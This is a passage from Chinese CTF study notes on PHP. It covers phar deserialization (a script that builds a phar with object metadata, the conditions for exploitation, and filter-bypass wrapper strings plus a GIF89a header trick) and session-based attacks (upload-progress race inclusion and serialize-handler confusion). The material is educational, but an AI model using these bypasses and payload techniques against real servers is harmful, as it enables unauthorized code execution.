+<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，
+如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。</p>
+<p>php中一些常见的流包装器如下：</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-32-1">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
+</span><span id="__span-32-2">http:// — 访问 HTTP(s) 网址
+</span><span id="__span-32-3">ftp:// — 访问 FTP(s) URLs
+</span><span id="__span-32-4">php:// — 访问各个输入/输出流（I/O streams）
+</span><span id="__span-32-5">zlib:// — 压缩流
+</span><span id="__span-32-6">data:// — 数据（RFC 2397）
+</span><span id="__span-32-7">glob:// — 查找匹配的文件路径模式
+</span><span id="__span-32-8">phar:// — PHP 归档
+</span><span id="__span-32-9">ssh2:// — Secure Shell 2
+</span><span id="__span-32-10">rar:// — RAR
+</span><span id="__span-32-11">ogg:// — 音频流
+</span><span id="__span-32-12">expect:// — 处理交互式的流
+</span></code></pre></div></td></tr></table></div>
+<h3 id="phar_2">phar文件的结构<a class="headerlink" href="#phar_2" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-33-1">stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。
+</span><span id="__span-33-2">
+</span><span id="__span-33-3">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
+</span><span id="__span-33-4">
+</span><span id="__span-33-5">content:被压缩文件的内容
+</span><span id="__span-33-6">
+</span><span id="__span-33-7">signature (可空):签名，放在末尾。
+</span></code></pre></div></td></tr></table></div>
+<p>下面生成一个phar文件</p>
+<p>前提：开启php.ini中的 phar.readonly = off</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-34-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-34-2"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
+</span><span id="__span-34-3"><span class="p">}</span>
+</span><span id="__span-34-4">
+</span><span id="__span-34-5"><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;phar.phar&quot;</span><span class="p">);</span>
+</span><span id="__span-34-6"><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&quot;phar.phar&quot;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar</span>
+</span><span id="__span-34-7"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+</span><span id="__span-34-8"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="p">);</span> <span class="c1">//设置stub</span>
+</span><span id="__span-34-9"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
+</span><span id="__span-34-10"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest</span>
+</span><span id="__span-34-11"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&quot;test.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件</span>
+</span><span id="__span-34-12"><span class="c1">//签名自动计算</span>
+</span><span id="__span-34-13"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+</span><span id="__span-34-14"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_10">漏洞利用条件<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<ol>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且 : 、 / 、 phar 等特殊字符没有被过滤。</li>
+</ol>
+<h3 id="_11">受影响的函数：<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<p><a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
+<h3 id="_12">绕过方式<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p>当环境限制了phar不能出现在前面的字符里。可以使用 <code>compress.bzip2://</code> 和 <code>compress.zlib://</code> 等绕过</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-35-1">compress.bzip://phar:///test.phar/test.txt
+</span><span id="__span-35-2">compress.bzip2://phar:///test.phar/test.txt
+</span><span id="__span-35-3">compress.zlib://phar:///home/sx/test.phar/test.txt
+</span><span id="__span-35-4">php://filter/resource=phar:///test.phar/test.txt
+</span></code></pre></div></td></tr></table></div>
+<p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</p>
+<p>php://filter/read=convert.base64-encode/resource=phar://phar.phar</p>
+<p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p>
+<p>1、$phar-&gt;setStub(“GIF89a”.""); //设置stub</p>
+<p>2、生成一个phar.phar，修改后缀名为phar.g</p>
+<h2 id="php-session">php-session反序列化<a class="headerlink" href="#php-session" title="Permanent link">&para;</a></h2>
+<h3 id="session">session简单介绍<a class="headerlink" href="#session" title="Permanent link">&para;</a></h3>
+<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
+<p>当第一次访问网站时，seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将 Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
+<h3 id="session_1">session 的存储机制<a class="headerlink" href="#session_1" title="Permanent link">&para;</a></h3>
+<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项 session.save_handler来进行确定的，默认是以文件的方式存储。</p>
+<p>存储的文件是以sess_sessionid来进行命名的</p>
+<p>session_start();运行之后开启session并且产生一个唯一的32位的session_id</p>
+<h3 id="sessiontip">session文件创建的几个tip<a class="headerlink" href="#sessiontip" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>代码中有session_start(),会自动创建session文件。</p>
+</li>
+<li>
+<p>如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session（也就创建了 session文件），不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
+</li>
+<li>session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。</li>
+</ol>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-36-1">比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。 即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(&quot;session.upload_progress.prefix&quot;)+由我们构造的session.upload_progress.name 值组成，最后被写入session文件里。
+</span></code></pre></div></td></tr></table></div>
+<p>注意：如果默认配置 session.upload_progress.cleanup = on 导致文件上传后，session文件内容立即清空。这时我们就要利用竞争，在session文件内容清空前进行包含利用。</p>
+<h3 id="phpinisession">php.ini中一些session配置<a class="headerlink" href="#phpinisession" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-37-1">session.save_path=“” --设置session的存储路径
+</span><span id="__span-37-2">session.save_handler=“”–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
+</span><span id="__span-37-3">session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动
+</span><span id="__span-37-4">session.serialize_handler string–定义用来序列化/反序列化的处理器名字。默认使用php
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_13">利用姿势<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<p>session.upload_progress进行文件包含和反序列化渗透</p>
+<p><a href="https://www.freebuf.com/vuls/202819.ht">https://www.freebuf.com/vuls/202819.ht</a></p>
+<h3 id="session_2">使用不同的引擎来处理session文件<a class="headerlink" href="#session_2" title="Permanent link">&para;</a></h3>
+<p><strong>$_SESSION变量直接可控</strong></p>
+<p>php引擎的存储格式是 键名|serialized_string ，而php_serialize引擎的存储格式是 serialized_string 。如果程序使用两个引擎来分别处理的话就会出现问题</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-38-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-38-2"><span class="nb">session_start</span><span class="p">();</span>
+</span><span id="__span-38-3"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;aaa&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bbb&#39;</span><span class="p">;</span>
+</span><span id="__span-38-4"><span class="c1">//aaa|s:3:&quot;bbb&quot;;</span>
+</span><span id="__span-38-5"><span class="c1">//该引擎使用的是php，会把&#39;|&#39;看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对&#39;|&#39;后的值进行反序列化处理。</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-39-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-39-2"><span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span><span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
+</span><span id="__span-39-3"><span class="nb">session_start</span><span class="p">();</span>
+</span><span id="__span-39-4"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;aaa&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bbb&#39;</span><span class="p">;</span>
+</span><span id="__span-39-5"><span class="c1">//a:1:{s:3:&quot;aaa&quot;;s:3:&quot;bbb&quot;;}</span>
+</span><span id="__span-39-6"><span class="c1">//php_serialize引擎只会把&#39;|&#39;当做一个正常的字符</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>ctfshow web263</strong></p>
+<p>python反序列化</p>
+<p>ctfshow277，278</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      侯霖钰 AnistonH
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/AnistonH" target="_blank" rel="noopener" title="GitHub | AnistonH" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://space.bilibili.com/527117890" target="_blank" rel="noopener" title="Bilibili | 邓紫棋山西分棋" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M488.6 104.1c16.7 18.1 24.4 39.7 23.3 65.7v202.4c-.4 26.4-9.2 48.1-26.5 65.1-17.2 17-39.1 25.9-65.5 26.7H92.02c-26.45-.8-48.21-9.8-65.28-27.2C9.682 419.4.767 396.5 0 368.2V169.8c.767-26 9.682-47.6 26.74-65.7C43.81 87.75 65.57 78.77 92.02 78h29.38L96.05 52.19c-5.75-5.73-8.63-13-8.63-21.79 0-8.8 2.88-16.06 8.63-21.797C101.8 2.868 109.1 0 117.9 0q13.2 0 21.9 8.603L213.1 78h88l74.5-69.397C381.7 2.868 389.2 0 398 0q13.2 0 21.9 8.603c5.7 5.737 8.6 12.997 8.6 21.797 0 8.79-2.9 16.06-8.6 21.79L394.6 78h29.3c26.4.77 48 9.75 64.7 26.1m-38.8 69.7c-.4-9.6-3.7-17.4-10.7-23.5-5.2-6.1-14-9.4-22.7-9.8H96.05c-9.59.4-17.45 3.7-23.58 9.8-6.14 6.1-9.4 13.9-9.78 23.5v194.4c0 9.2 3.26 17 9.78 23.5s14.38 9.8 23.58 9.8H416.4c9.2 0 17-3.3 23.3-9.8s9.7-14.3 10.1-23.5zm-264.3 42.7c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2-6.2 6.3-14 9.5-23.6 9.5s-17.5-3.2-23.6-9.5-9.4-14-9.8-23.2v-33.3c.4-9.1 3.8-16.9 10.1-23.2s13.2-9.6 23.3-10c9.2.4 17 3.7 23.3 10m191.5 0c6.3 6.3 9.7 14.1 10.1 23.2V273c-.4 9.2-3.7 16.9-9.8 23.2s-14 9.5-23.6 9.5-17.4-3.2-23.6-9.5c-7-6.3-9.4-14-9.7-23.2v-33.3c.3-9.1 3.7-16.9 10-23.2s14.1-9.6 23.3-10c9.2.4 17 3.7 23.3 10"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://AnistonH.github.io/ME/support/" target="_blank" rel="noopener" title="打赏支持" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M96 64c0-17.7 14.3-32 32-32h384c70.7 0 128 57.3 128 128s-57.3 128-128 128h-32c0 53-43 96-96 96H192c-53 0-96-43-96-96zm384 160h32c35.3 0 64-28.7 64-64s-28.7-64-64-64h-32zM32 416h512c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.sections", "navigation.prefetch", "navigation.instant.prefetch", "navigation.progress", "navigation.instant.progress", "navigation.path", "navigation.tabs", "navigation.top", "navigation.indexes", "navigation.expand", "search.suggest", "search.highlight", "content.code.copy", "content.action.view"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.56dfad97.min.js"></script>
+      
+        <script src="../../../mkdocs/javascripts/katex.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
